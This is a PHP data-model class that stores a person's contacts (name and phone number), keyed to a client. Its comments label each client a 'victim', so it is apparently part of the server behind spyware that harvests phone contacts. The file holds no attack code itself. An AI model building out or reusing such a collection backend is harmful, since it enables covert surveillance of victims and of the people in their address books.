<?php

namespace Server\Model;

/**
 * Victim's contacts
 */
class Contact
{
    /** @var int $id Contact id */
    private int $id;

    /** @var int $clientID Victim's ID */
    private int $clientID;

    /** @var string $name Contact's name */
    private string $name;

    /** @var string $number Contact's number */
    private string $number;

    public function __construct(int $id, int $clientID, string $name, string $number)
    {
        $this->id = $id;
        $this->clientID = $clientID;
        $this->name = $name;
        $this->number = $number;    
    }

    /**
     * Get contact's ID
     * 
     * @return int
     */
    public function getID(): int
    {
        return $this->id;
    }

    /**
     * Get client's ID
     * 
     * @return int
     */
    public function getClientID(): int
    {
        return $this->clientID;
    }

    /**
     * Get contact's name
     * 
     * @return string
     */
    public function getName(): string
    {
        return $this->name;
    }

    /**
     * Get contact's number
     * 
     * @return string
     */
    public function getNumber(): string
    {
        return $this->number;
    }
}